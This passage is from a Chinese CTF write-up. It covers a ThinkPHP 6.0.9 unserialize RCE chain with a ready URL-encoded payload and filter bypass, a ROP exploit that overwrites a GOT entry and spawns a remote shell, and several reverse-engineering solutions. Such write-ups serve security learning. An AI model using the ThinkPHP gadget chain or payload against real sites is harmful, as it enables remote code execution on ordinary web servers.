ZSkpeyBkaWUoJzxoMj4gbm8gZmxhZy4uJyk7fQogICAgICAgICAgICBpZihmaWxlX2V4aXN0cygkZmlsZSkpewogICAgICAgICAgICAgICAgZWNobyAiZmlsZV9leGlzdHMoKSByZXR1cm4gdHJ1ZS4uPC9icj4iOwogICAgICAgICAgICAgICAgZGllKCAiaGFja2VyISEhIik7CiAgICAgICAgICAgIH1lbHNlIHsKICAgICAgICAgICAgICAgIGVjaG8gImZpbGVfZXhpc3RzKCkgcmV0dXJuIGZhbHNlLi4iOwogICAgICAgICAgICAgICAgQGhpZ2hsaWdodF9maWxlKCRmaWxlKTsKICAgICAgICAgICAgfQoKICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgZWNobyAiRXJyb3IhIG5vIGZpbGUgcGFyYW1ldGVyIDxici8+IjsKICAgICAgICAgICAgZWNobyAiaGlnaGxpZ2h0X2ZpbGUgRXJyb3IiOwogICAgICAgIH0KCiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIHVuc2VyKCl7CiAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3Z1bHZ1bCddKSl7CiAgICAgICAgICAgICRzZXIgPSAkX0dFVFsndnVsdnVsJ107CiAgICAgICAgICAgICR2dWwgPSBwYXJzZV91cmwoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pOwogICAgICAgICAgICBwYXJzZV9zdHIoJHZ1bFsncXVlcnknXSwkcXVlcnkpOwoKICAgICAgICAgICAgZm9yZWFjaCgkcXVlcnkgYXMgJHZhbHVlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvTy9pIiwkdmFsdWUpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGRpZSgnPC9icj4gPGgxPkhhY2tpbmc/Jyk7CiAgICAgICAgICAgICAgICAgICAgZXhpdCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHVuc2VyaWFsaXplKCRzZXIpOwogICAgICAgIH0KCiAgICB9Cn0K
```

base64解码下

```php
<?php

namespace app\controller;

use app\BaseController;

class Index extends BaseController
{
    public function index()
    {
        //return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V6<br/><span style="font-size:30px">13载初心不改 - 你值得信赖的PHP框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
        if (isset($_GET['file'])) {
            $file = $_GET['file'];
            $file = trim($file);
            $file = preg_replace('/\s+/','',$file);
            if(preg_match("/flag/i",$file)){ die('<h2> no flag..');}
            if(file_exists($file)){
                echo "file_exists() return true..</br>";
                die( "hacker!!!");
            }else {
                echo "file_exists() return false..";
                @highlight_file($file);
            }

        } else {
    
            echo "Error! no file parameter <br/>";
            echo "highlight_file Error";
        }
    
    }
    
    public function unser(){
        if(isset($_GET['vulvul'])){
            $ser = $_GET['vulvul'];
            $vul = parse_url($_SERVER['REQUEST_URI']);
            parse_str($vul['query'],$query);
    
            foreach($query as $value)
            {
                if(preg_match("/O/i",$value))
                {
                    die('</br> <h1>Hacking?');
                    exit();
                }
            }
            unserialize($ser);
        }
    
    }

}
```

审下代码有反序列化点，tp版本之前报错页面得到是6.0.9

![](https://p2.ssl.qhimg.com/t01eed5f2b649826df4.png)

找链子触发，题目有个过滤`O`,参考博客<https://www.cnblogs.com/tr1ple/p/11137159.html>。利用`///`绕过。

链子用的是这条：

exp

```php
<?php

namespace think {

    use think\route\Url;

    abstract class Model
    {
        private $lazySave;
        private $exists;
        protected $withEvent;
        protected $table;
        private $data;
        private $force;
        public function __construct()
        {
            $this->lazySave = true;
            $this->withEvent = false;
            $this->exists = true;
            $this->table = new Url();
            $this->force = true;
            $this->data = ["1"];
        }
    }
}

namespace think\model {

    use think\Model;

    class Pivot extends Model
    {
        function __construct()
        {
            parent::__construct();
        }
    }
    $b = new Pivot();
    echo urlencode(serialize($b));
}

namespace think\route {

    use think\Middleware;
    use think\Validate;

    class Url
    {
        protected $url;
        protected $domain;
        protected $app;
        protected $route;
        public function __construct()
        {
            $this->url = 'a:';
            $this->domain = "<?php system('cat /flag');?>";
            $this->app = new Middleware();
            $this->route = new Validate();
        }
    }
}

namespace think {

    use think\view\driver\Php;

    class Validate
    {
        public function __construct()
        {
            $this->type['getDomainBind'] = [new Php(), 'display'];
        }
    }
    class Middleware
    {
        public function __construct()
        {
            $this->request = "2333";
        }
    }
}

namespace think\view\driver {
    class Php
    {
        public function __construct()
        {
        }
    }
}

```

payload：

```url
///public/index.php/Index/unser?vulvul=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A15%3A%22think%5Croute%5CUrl%22%3A4%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A2%3A%22a%3A%22%3Bs%3A9%3A%22%00%2A%00domain%22%3Bs%3A38%3A%22%3C%3Fphp+system%28%22cat+%2Fflag%22%29%3B+exit%28%29%3B%0D%0A%3F%3E%22%3Bs%3A6%3A%22%00%2A%00app%22%3BO%3A16%3A%22think%5CMiddleware%22%3A1%3A%7Bs%3A7%3A%22request%22%3Bi%3A2333%3B%7Ds%3A8%3A%22%00%2A%00route%22%3BO%3A14%3A%22think%5CValidate%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00type%22%3Ba%3A1%3A%7Bs%3A13%3A%22getDomainBind%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22think%5Cview%5Cdriver%5CPhp%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22display%22%3B%7D%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A7%3B%7D%7D
```

得到flag

![](https://p3.ssl.qhimg.com/t01afbf8efb8023dc71.png)

## pwn

### blind

基本检查

```text
socphob@giao:/mnt/c/Users/admin/Desktop/xhlj$ checksec ./blind
[*] '/mnt/c/Users/admin/Desktop/xhlj/blind'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
socphob@giao:/mnt/c/Users/admin/Desktop/xhlj$
```

main

```c
ssize_t __fastcall main(int a1, char **a2, char **a3)
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  alarm(8u);
  sleep(3u);
  return read(0, buf, 0x500uLL);
}
```

题目非常简短，main函数里面仅仅调用了`alarm`，`sleep`和`read`，就是普通的栈溢出，但是没有输出函数，看起来是没法泄露leak libc的。那这里怎么办？函数在首次执行时，会把真实地址写到got表的表项中，它是一个libc的地址，低一个半字节是固定的，这里可以通过ROP爆破修改got表项的低字节来使他指向它附近的地址，在libc2.27-2.23中`alarm + 5`的位置有`syscall`，在`2.31`中在`alarm + 9`，可以爆破修改`alarm@got.plt` 为`0x5, 0x15 ... 0xf5` 或者 `0x9,0x19...0xf9` 来改为`syscall`,然后ROP通过系统调用执行`/bin/sh`。

> Don't try to guess the libc version or Brute-force attack.Believe me, there will be no results,but there is a general way to solve it.

然后这里就不得不吐槽题目附件中的`readme.txt`，属实把我坑到了。让不要去猜libc版本和暴力攻击，再加上我上午爆破了一次（包括0xd5），没有打通。我就开始怀疑是不是我的做法有问题，libc魔改了？然后就到网上一直搜只有`read`，无法leak怎么做，一直尝试各种方法，general way我以为有什么妙招我不知道。最后绕了半天，又回到了最开始，(0xd5打通了)

got表

![](https://p2.ssl.qhimg.com/t011924c9457eeaf291.png)

实现`syscall`调用`execve('/bin/sh\x00',0,0)`。

![](https://p4.ssl.qhimg.com/t014e6d0d6a1b60c35c.png)

ROP的思路是先调用三次read，1.将`alarm@got.plt`的低字节改为0x?5，2.把`/bin/sh/\x00`写到bss段，3.控制`rax`为0x3b。 然后`ret2csu`执行。

`ret2csu`，通过`r13`控制`rdi`，通过`r12`和`rbx`调用`alarm`。

![](https://p2.ssl.qhimg.com/t01a8ef9b8332d3dd7d.png)

EXP：

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
p = remote('82.157.6.165', 31400)
# p = process('./blind')
elf = ELF('./blind')

bss = 0x601040
pop_rdi_ret = 0x4007c3
pop_rsi_r15_ret = 0x4007c1

# 往bss中写入 /bin/sh\x00
sleep(3)
payload = b'A' * 0x58 + p64(pop_rsi_r15_ret) + p64(bss) + p64(0) + p64(elf.plt['read'])
payload += p64(pop_rsi_r15_ret) + p64(elf.got['alarm']) + p64(0) + p64(elf.plt['read'])  # 改写alarm的值
payload += p64(pop_rsi_r15_ret) + p64(0x601050) + p64(0) + p64(elf.plt['read'])  # 这里调用read是为了控制rax为0x3b
payload += p64(0x4007BA) + p64(0) + p64(1) + p64(elf.got['alarm']) + p64(0) + p64(0) + p64(bss) + p64(
    0x4007A0)  # 通过ret2csu控制其他参数
p.sendline(payload)
sleep(0.5)
p.sendline(b'/bin/sh\x00')
sleep(0.5)
p.send(b'\xd5')  # 改写alarm到syscall'
sleep(0.5)
p.send(b'C' * 0x3b)  # 使得rax=0x3b
p.sendline('cat /flag')
p.interactive()

```

## re

### TacticalArmed

根据main函数和`sub_4011F0`可以注意到 这是一个shellcode动态生成器，每一轮会复制新的汇编语句，然后执行一句后返回，期间保存寄存器信息

![](https://p2.ssl.qhimg.com/t01d5c0a02e436ce128.png)

大概执行了这些关键shellcode 从而定位到此可能为TEA算法

```assembly
;忽略部分代码
sub ecx, 0x7E5A96D2
;忽略部分代码
shr edx, 0x5
;忽略部分代码
shl edx, 0x4
```

然后key 在 `405000` 在TLS_CALLBACK 用利用`int 2d`检测调试器 替换key。

经过调试发现 此不为标准算法：

此TEA算法有33轮，并且每轮TEA加密后的sum 不会清0

最终写出exp

```C
#include <windows.h>

void my_TEA_decrypt(uint32_t* v, uint32_t* k,uint32_t sum) {
    uint32_t v0 = v[0], v1 = v[1], i;  /* set up */
    uint32_t delta = 0x7E5A96D2;                     /* a key schedule constant */
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */
    for (i = 0; i <= 32; i++) {                         /* basic cycle start */
        v1 -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
        v0 -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        sum += delta;
    }                                              /* end cycle */
    v[0] = v0; v[1] = v1;
}
void my_TEA_encrypt(uint32_t* v, uint32_t* k) {
    uint32_t v0 = v[0], v1 = v[1], sum = 0, i;           /* set up */
    uint32_t delta = 0x7E5A96D2;                     /* a key schedule constant */
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */
    for (i = 0; i <= 32; i++) {                       /* basic cycle start */
        sum -= delta;
        v0 += ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        v1 += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
        printf("%lx,%lx,%d\n", v0, v1,i);
    }                                              /* end cycle */
    v[0] = v0; v[1] = v1;
}
int main()
{
    uint32_t test[2] = { 0x67616c66,0x6161617b };
    uint32_t k[4] = { 0x7CE45630, 0x58334908, 0x66398867, 0xC35195B1 };
    my_TEA_encrypt(test, k);
    uint32_t r = 0;
    uint32_t a = 0x7E5A96D2;
    uint32_t fake_key[4] = { 0x22836719,0x0A5978C21 ,0x79573824,0x330B55EF };

    uint32_t Enc[] = { 0x422F1DED, 0x1485E472, 0x035578D5, 0xBF6B80A2, 0x97D77245, 0x2DAE75D1, 0x665FA963, 0x292E6D74,
0x9795FCC1, 0x0BB5C8E9 };

    char key[41] = { 0 };
    for (int i = 0; i < 33; i++) {
        r -= a;
    }
    my_TEA_decrypt(Enc, k,r);
    for (int i = 0; i < 33; i++) {
        r -= a;
    }my_TEA_decrypt(Enc+ 2, k,r);
    for (int i = 0; i < 33; i++) {
        r -= a;
    }my_TEA_decrypt(Enc + 4, k,r);
    for (int i = 0; i < 33; i++) {
        r -= a;
    }my_TEA_decrypt(Enc + 6, k,r);
    for (int i = 0; i < 33; i++) {
        r -= a;
    }my_TEA_decrypt(Enc +8, k,r);
    memcpy(key, Enc, 40);
    printf("%s", key);
}
```

### ror

程序逻辑非常简单，但是发现变换非常复杂

通过取出索引值发现每8组加密完成后的首个Enc 均为0

同时 程序会右移`j`或者左移 `8-j` 这明显只有一个保留数值，并且由于`j`与数组的相关性。猜测这种算法

每8个字母的`ascii`组成8*8矩阵，再进行一次置换得到Enc

于是写出exp:

```python
sb = [0x65, 0x55, 0x24, 0x36, 0x9D, 0x71, 0xB8, 0xC8, 0x65, 0xFB,
      0x87, 0x7F, 0x9A, 0x9C, 0xB1, 0xDF, 0x65, 0x8F, 0x9D, 0x39,
      0x8F, 0x11, 0xF6, 0x8E, 0x65, 0x42, 0xDA, 0xB4, 0x8C, 0x39,
      0xFB, 0x99, 0x65, 0x48, 0x6A, 0xCA, 0x63, 0xE7, 0xA4, 0x79]
table = [101, 8, 247, 18, 188, 195, 207, 184, 131, 123,
         2, 213, 52, 189, 159, 51, 119, 118, 212, 215,
         235, 144, 137, 94, 84, 1, 125, 244, 17, 255,
         153, 73, 173, 87, 70, 103, 42, 157, 127, 210,
         225, 33, 139, 29, 90, 145, 56, 148, 249, 12,
         0, 202, 232, 203, 95, 25, 246, 240, 60, 222,
         218, 234, 156, 20, 117, 164, 13, 37, 88, 252,
         68, 134, 5, 107, 67, 154, 109, 209, 99, 152,
         104, 45, 82, 61, 221, 136, 214, 208, 162, 237,
         165, 59, 69, 62, 242, 34, 6, 243, 26, 168,
         9, 220, 124, 75, 92, 30, 161, 176, 113, 4,
         226, 155, 183, 16, 78, 22, 35, 130, 86, 216,
         97, 180, 36, 126, 135, 248, 10, 19, 227, 228,
         230, 28, 53, 44, 177, 236, 147, 102, 3, 169,
         149, 187, 211, 81, 57, 231, 201, 206, 41, 114,
         71, 108, 112, 21, 223, 217, 23, 116, 63, 98,
         205, 65, 7, 115, 83, 133, 49, 138, 48, 170,
         172, 46, 163, 80, 122, 181, 142, 105, 31, 106,
         151, 85, 58, 178, 89, 171, 224, 40, 192, 179,
         190, 204, 198, 43, 91, 146, 238, 96, 32, 132,
         77, 15, 38, 74, 72, 11, 54, 128, 93, 111,
         76, 185, 129, 150, 50, 253, 64, 141, 39, 193,
         120, 79, 121, 200, 14, 140, 229, 158, 174, 191,
         239, 66, 197, 175, 160, 194, 250, 199, 182, 219,
         24, 196, 166, 254, 233, 245, 110, 100, 47, 241,
         27, 251, 186, 167, 55, 143]

# for i in sb:
#     print(table.index(i), end=",")
table = [0,181,122,206,37,108,7,223,0,251,124,38,75,62,134,154,0,255,37,144,255,28,56,176,0,231,60,121,225,144,251,30,0,204,179,51,78,145,65,222]
for j in range(0,len(table),8):
    temp = []
    for i in range(8):
        r = bin(table[i + j]).lstrip("0b").rjust(8,"0")
        # print(r)
        tempstr = []
        for elem in r:
            tempstr.append(int(elem))
        temp.append(tempstr)
    # print(temp)
    for c in range(8):
        v = 0
        for n in range(8):
            v <<=1
            v += temp[n][c]
        print(chr(v),end="")
```

### 虚假的粉丝

理清程序逻辑后，始终没发现验证flag的地方 也没发现隐藏加载手段

按正常逻辑找到程序需要的key:

```python
path = r"D:\Users\CShi\Desktop\music\f\\"
import re
import tqdm
for i in tqdm.trange(1, 5317):
    filename = "ASCII-faded {}.txt".format(str(i).rjust(4, '0'))
    file = path + filename
    with open(file, "rb") as f:
        result = f.read()
        sub = "U"
        r = [substr.start() for substr in re.finditer(sub, result)]
        for c in r:
            if result[c + 39] == 'S':
                print i, c
```

得到4157 1118

第三个key随便输

![](https://p0.ssl.qhimg.com/t014f2f20b95422deb3.png)

虽然是字符画组成的音乐，考虑到可能输出是key，base64解码后得到

```plain
S3Cre7_K3y%20%3D%20Al4N_wAlK3R
```

Al4N_wAlK3R

输入后打开5135.txt

将文本缩小拿到 flag

BTW，此题更适合放到misc

### gghdl

本来以为又是一道虚拟机题目，进入main 发现这是`ghdl` 虚拟机

字符串搜索到了”Input Flag“，好像不是虚拟机或者说脚本代码被内联编译了

主要逻辑在`sub_2DCE0`，`case 5`的`v37 = *(_DWORD *)(a1 + 272);`是否等于44 是判断正确错误的条件，操作`*(_DWORD *)(a1 + 272);`的逻辑在`case 7`，对比的主要逻辑在`v15 = sub_C140(v122, v119);`。`v119` 是`sub_231D0(&v120, (unsigned int)v14, 8LL);` 来的。`v14` 是`v14 = dword_DC460[v13];` 是Enc

进入`sub_231D0` 函数 此函数实际为二进制转换函数，只是0 相当于2 1 相当于3

`v122`未知 可能为输入变换而来。根据对输入的测试，发现输入值异或了`0x9c`

最终的exp：

```python
enc = [0xD8, 0xDD, 0xCF, 0xDF, 0xC8, 0xDA, 0xE7, 0xAC,
       0xAA, 0xAE, 0xA5, 0xAD, 0xA5, 0xAA, 0xAE, 0xB1,
       0xFD, 0xFE, 0xFD, 0xF8, 0xB1, 0xA8, 0xAC, 0xFF,
       0xA4, 0xB1, 0xA4, 0xAF, 0xAD, 0xA4, 0xB1, 0xFA,
       0xAC, 0xFD, 0xAA, 0xFE, 0xAD, 0xA4, 0xAA, 0xA8,
       0xA4, 0xAE, 0xFF, 0xE1]
xor = 0x9c
print(len(enc))
flag = ""
for i in range(len(enc)):
    flag += chr(xor ^ enc[i])
print (flag)
# DASCTF{06291962-abad-40c8-8318-f0a6b186482c}
```
